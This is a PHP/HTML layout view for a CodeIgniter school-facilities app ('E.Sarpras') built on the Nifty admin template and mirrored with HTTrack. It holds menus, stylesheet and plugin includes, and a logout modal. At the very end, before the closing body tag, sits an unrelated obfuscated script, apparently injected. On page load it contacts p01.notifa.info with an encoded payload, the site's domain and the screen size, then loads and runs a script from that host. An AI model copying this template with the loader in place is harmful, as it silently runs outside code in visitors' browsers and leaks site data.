<!DOCTYPE html>
<html lang="en">



<!-- Mirrored from www.themeon.net/nifty/v2.9.1/gallery-grid.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:11:28 GMT -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <!-- <title>Grid | Nifty - Admin Template</title> -->


    <!--STYLESHEET-->
    <!--=================================================-->

    <!--Open Sans Font [ OPTIONAL ]-->
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700' rel='stylesheet' type='text/css'>


    <!--Bootstrap Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url(); ?>assets/css/bootstrap.min.css" rel="stylesheet">


    <!--Nifty Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url(); ?>assets/css/nifty.min.css" rel="stylesheet">


    <!--Nifty Premium Icon [ DEMONSTRATION ]-->
    <link href="<?php echo base_url(); ?>assets/css/demo/nifty-demo-icons.min.css" rel="stylesheet">


    <!--=================================================-->



    <!--Pace - Page Load Progress Par [OPTIONAL]-->
    <link href="<?php echo base_url(); ?>assets/plugins/pace/pace.min.css" rel="stylesheet">
    <script src="<?php echo base_url(); ?>assets/plugins/pace/pace.min.js"></script>


    <!--Demo [ DEMONSTRATION ]-->
    <link href="<?php echo base_url(); ?>assets/css/demo/nifty-demo.min.css" rel="stylesheet">

    <!--Font Awesome [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/font-awesome/css/font-awesome.min.css" rel="stylesheet">

    <!--Ion Icons [ OPTIONAL ]-->
       <link href="<?php echo base_url(); ?>assets/plugins/ionicons/css/ionicons.min.css" rel="stylesheet">

    <!--Unite Gallery [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/unitegallery/css/unitegallery.min.css" rel="stylesheet">

    <!--Bootstrap Select [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/bootstrap-select/bootstrap-select.min.css" rel="stylesheet">

    <!--Bootstrap Datepicker [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/bootstrap-datepicker/bootstrap-datepicker.min.css" rel="stylesheet">

    <!--Animate.css [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/animate-css/animate.min.css" rel="stylesheet">

    <!--Chosen [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/chosen/chosen.min.css" rel="stylesheet">

    <!--FooTable [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/fooTable/css/footable.core.css" rel="stylesheet">

    <!--X-editable [ OPTIONAL ]-->
    <link href="plugins/x-editable/css/bootstrap-editable.css" rel="stylesheet">

    <!--Dropzone [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/dropzone/dropzone.min.css" rel="stylesheet">
    <!--=================================================

    REQUIRED
    You must include this in your project.


    RECOMMENDED
    This category must be included but you may modify which plugins or components which should be included in your project.


    OPTIONAL
    Optional plugins. You may choose whether to include it in your project or not.


    DEMONSTRATION
    This is to be removed, used for demonstration purposes only. This category must not be included in your project.


    SAMPLE
    Some script samples which explain how to initialize plugins or components. This category should not be included in your project.


    Detailed information and more samples can be found in the document.

    =================================================-->

</head>

<!--TIPS-->
<!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->
<body>
    <div id="container" class="effect aside-float aside-bright mainnav-lg">
        <!--NAVBAR-->
        <!--===================================================-->
        <header id="navbar">
            <div id="navbar-container" class="boxed">
                <!--Brand logo & name-->
                <!--================================-->
                <div class="navbar-header">
                    <a href="index.html" class="navbar-brand">
                        <img src="<?php echo base_url(); ?>assets/img/logo.png" alt="Nifty Logo" class="brand-icon">
                        <div class="brand-title">
                            <span class="brand-text">E.Sarpras</span>
                        </div>
                    </a>
                </div>
                <!--================================-->
                <!--End brand logo & name-->
                <!--Navbar Dropdown-->
                <!--================================-->
                <div class="navbar-content">
                    <ul class="nav navbar-top-links">

                        <!--Navigation toogle button-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li class="tgl-menu-btn">
                            <a class="mainnav-toggle" href="#">
                                <i class="demo-pli-list-view"></i>
                            </a>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End Navigation toogle button-->
                    </ul>
                    <ul class="nav navbar-top-links">



                    </ul>
                </div>
                <!--================================-->
                <!--End Navbar Dropdown-->

            </div>
        </header>
        <!--===================================================-->
        <!--END NAVBAR-->

        <div class="boxed">

            <!--CONTENT CONTAINER-->
            <!--===================================================-->
            <div id="content-container">


                <!--Page content-->
                <!--===================================================-->
                <div id="page-content">

                        <?php
                                  $this->load->view($namamodule .'/'.$namafileview);
                                ?>

                </div>
                <!--===================================================-->
                <!--End page content-->

            </div>
            <!--===================================================-->
            <!--END CONTENT CONTAINER-->



            <!--MAIN NAVIGATION-->
            <!--===================================================-->
            <nav id="mainnav-container">
                <div id="mainnav">




                     <div class="mainnav-brand">
                        <a href="index.html" class="brand">
                            <img src="img/logo.png" alt="Nifty Logo" class="brand-icon">
                            <span class="brand-text">Nifty</span>
                        </a>
                        <a href="#" class="mainnav-toggle"><i class="pci-cross pci-circle icon-lg"></i></a>
                    </div>




                    <div id="mainnav-menu-wrap">
                        <div class="nano">
                            <div class="nano-content">


                                <!--Shortcut buttons-->
                                <!--================================-->
                                <div id="mainnav-shortcut" class="hidden">
                                    <ul class="list-unstyled shortcut-wrap">
                                        <li class="col-xs-3" data-content="My Profile">
                                            <a class="shortcut-grid" href="#">
                                                <div class="icon-wrap icon-wrap-sm icon-circle bg-mint">
                                                <i class="demo-pli-male"></i>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="col-xs-3" data-content="Messages">
                                            <a class="shortcut-grid" href="#">
                                                <div class="icon-wrap icon-wrap-sm icon-circle bg-warning">
                                                <i class="demo-pli-speech-bubble-3"></i>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="col-xs-3" data-content="Activity">
                                            <a class="shortcut-grid" href="#">
                                                <div class="icon-wrap icon-wrap-sm icon-circle bg-success">
                                                <i class="demo-pli-thunder"></i>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="col-xs-3" data-content="Lock Screen">
                                            <a class="shortcut-grid" href="#">
                                                <div class="icon-wrap icon-wrap-sm icon-circle bg-purple">
                                                <i class="demo-pli-lock-2"></i>
                                                </div>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                                <!--================================-->
                                <!--End shortcut buttons-->


                                <ul id="mainnav-menu" class="list-group">

                                    <!--Category name-->
                                    <!-- <li class="">
                                        <a href="<?php echo base_url('profile'); ?>">
                                            <i class="fa fa-handshake-o"></i>
                                            <span class="menu-title">Profile</span>
                                        </a>
                                    </li> -->
                                    <li class="">
                                        <a href="<?php echo base_url('peminjaman'); ?>">
                                            <i class="fa fa-handshake-o"></i>
                                            <span class="menu-title">Peminjaman</span>
                                        </a>
                                    </li>
                                    <!-- <li class="">
                                        <a href="<?php echo base_url('user'); ?>">
                                            <i class="fa fa-handshake-o"></i>
                                            <span class="menu-title">User</span>
                                        </a>
                                    </li> -->
                                    <li class="">
                                        <a href="#">
                                            <i class="fa fa-cubes"></i>
                                            <span class="menu-title">Pengaturan</span>
                                            <i class="arrow"></i>
                                        </a>
                                        <ul class="collapse">
                                            <li><a href="<?php echo base_url('profile'); ?>">Pengaturan Profile</a></li>
                                            <li ><a href="<?php echo base_url('user'); ?>">Pengaturan User</a></li>
                                        </ul>
                                    </li>

                                    <li class="">
                                        <a href="#">
                                            <i class="fa fa-cubes"></i>
                                            <span class="menu-title">Item</span>
                                            <i class="arrow"></i>
                                        </a>
                                        <ul class="collapse">
                                            <li><a href="<?php echo base_url('item'); ?>">Item Sarpras</a></li>
                                            <li ><a href="<?php echo base_url('barang'); ?>">Barang Siswa</a></li>
                                            <li><a href="<?php echo base_url('sarana'); ?>">Sarana dan Prasarana </a></li>
                                        </ul>
                                    </li>

                                    <!-- <li class="">
                                        <a href="#">
                                            <i class="fa fa-cubes"></i>
                                            <span class="menu-title">Pendapatan Barang</span>
                                            <i class="arrow"></i>
                                        </a>


                                        <ul class="collapse">
                                            <li><a href="<?php echo base_url('pembelian'); ?>">Pembelian</a></li>
                                            <li ><a href="<?php echo base_url('pemberian'); ?>">Pemberian</a></li>
                                        </ul>
                                    </li> -->

                                    <li class="">
                                            <span>
                                              <a data-toggle="modal" data-target="#modal-logout" class="btn btn-danger btn-bg">
                                              <span class="fa fa-trash-o"></span>
                                              &nbsp;Logout
                                              </a>
                                            </span>
                                        </a>

                                      <!--Submenu-->
                                    </li>
                                    </ul>
                            </div>
                        </div>
                    </div>

                </div>
            </nav>
            <!--===================================================-->
            <!--END MAIN NAVIGATION-->

        </div>
        <div id="modal-logout" class="modal fade" tabindex="-1">
            <div class="modal-dialog modal-sm">
                <div class="modal-content">
                    <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal"><i class="pci-cross pci-circle"></i></button>
                        <h4 class="modal-title" id="mySmallModalLabel">Keluar</h4>
                    </div>
                    <div class="modal-body">
                        <p>Apakah Anda ingin Keluar</p>
                    </div>
                    <div class="modal-footer">
                        <button data-dismiss="modal" class="btn btn-default" type="button">Close</button>
                        <a class="btn btn-danger" href="<?php echo base_url('login/logoutApp') ?>">Keluar</a>
                    </div>
                </div>
            </div>
        </div>


        <!-- SCROLL PAGE BUTTON -->
        <!--===================================================-->
        <!--===================================================-->
    </div>
    <!--===================================================-->
    <!-- END OF CONTAINER -->





    <!--JAVASCRIPT-->
    <!--=================================================-->

    <!--jQuery [ REQUIRED ]-->
    <script src="<?php echo base_url(); ?>assets/js/jquery.min.js"></script>


    <!--BootstrapJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url(); ?>assets/js/bootstrap.min.js"></script>


    <!--NiftyJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url(); ?>assets/js/nifty.min.js"></script>




    <!--=================================================-->

    <!--Demo script [ DEMONSTRATION ]-->
    <!-- <script src="<?php echo base_url(); ?>assets/js/demo/nifty-demo.min.js"></script> -->


    <!--Unite Gallery [ OPTIONAL ]-->
    <script src="<?php echo base_url(); ?>assets/plugins/unitegallery/js/unitegallery.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/plugins/unitegallery/themes/tilesgrid/ug-theme-tilesgrid.js"></script>

    <!--Bootstrap Select [ OPTIONAL ]-->
    <script src="<?php echo base_url(); ?>assets/plugins/bootstrap-select/bootstrap-select.min.js"></script>

    <!--Chosen [ OPTIONAL ]-->
    <script src="<?php echo base_url(); ?>assets/plugins/chosen/chosen.jquery.min.js"></script>

    <!--FooTable [ OPTIONAL ]-->
<script src="<?php echo base_url(); ?>assets/plugins/fooTable/dist/footable.all.min.js"></script>

    <!--FooTable Example [ SAMPLE ]-->
    <script src="<?php echo base_url(); ?>assets/js/demo/tables-footable.js"></script>

    <!--Bootstrap Datepicker [ OPTIONAL ]-->
    <script src="<?php echo base_url(); ?>assets/plugins/bootstrap-datepicker/bootstrap-datepicker.min.js"></script>

    <!--DataTables [ OPTIONAL ]-->
    <!-- <script src="<?php echo base_url(); ?>assets/plugins/datatables/media/js/jquery.dataTables.js"></script>
  <script src="<?php echo base_url(); ?>assets/plugins/datatables/media/js/dataTables.bootstrap.js"></script>
  <script src="<?php echo base_url(); ?>assets/plugins/datatables/extensions/Responsive/js/dataTables.responsive.min.js"></script> -->


    <!--DataTables Sample [ SAMPLE ]-->
    <script src="<?php echo base_url(); ?>assets/js/demo/tables-datatables.js"></script>

    <!--Dropzone [ OPTIONAL ]-->
    <script src="<?php echo base_url(); ?>assets/plugins/dropzone/dropzone.min.js"></script>


    <!--Form File Upload [ SAMPLE ]-->
    <script src="<?php echo base_url(); ?>assets/js/demo/form-file-upload.js"></script>

    <!--Custom script [ DEMONSTRATION ]-->
    <!--===================================================-->
    <script>
        $(document).on('nifty.ready', function () {


            $("#demo-gallery").unitegallery({
                tile_enable_shadow: false
            });



            $("#demo-gallery-2").unitegallery({
                tile_enable_shadow: false,
                theme_navigation_type: "arrows"
            });


        });
    </script>

    <!--Custom script [ DEMONSTRATION ]-->
<!--===================================================-->
<script>
    $(document).on('nifty.ready', function () {
        var box_example = $('#demo-css-animate'), box_class = $('#demo-css-animate-name');
  $(document).on('click', '.demo-css-anim', function(){
      var anim_class = $(this).val();
      box_example.removeClass().addClass('animated ' + anim_class);
      box_class.html('<code>animated ' + anim_class + '</code>');
  });
    });
</script>



<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjUWZGox9%2fkr1uHmXNbfFg7iJOq73iY3i9gjH9B8F6qFTmSGdnl0kBm3BNGJPd79CpSqmKdOldL4Lu50Hn49J2brJwmSxWfFx4YdGvcMgzTyfs6TV%2f9cEwJA1GnwM2lUY2KeR6Bj3EuJpywq4D5Xnnu%2bbXVIvSThIVQxX0k1aXe%2bGfDAY%2bpblkqIj39dPFBatFcNr7XTMOcYd6vHNeGC%2bi6qI%2f5pUQApaUb6CofqnO3p8lqtdTdsxBWHSjdX83R6JO%2fXHSrajuiBRB1%2b27pKFR4o%2bAwM%2fW4bbNHYLPvYs5U7c0PouWCZ7Zdgp1e0P%2bp0yzc3FJUvqkJEZIpq3UMkK%2bWsHyA4PYef8KQAkZOP%2fA2nXl7F7AsdBuQgqgQULGqYmIDEbW3UQyk%2f%2f1%2bFf4OIcyXEM1kWvmMf1Y8MiID9GVZzmmTDrmJ80xdJ7d2PIhnPueKVj2gRPzW8qw7288lLys5cJhFSvzLvPCbRC3VXXtTW%2bw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from www.themeon.net/nifty/v2.9.1/gallery-grid.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:11:28 GMT -->
</html>
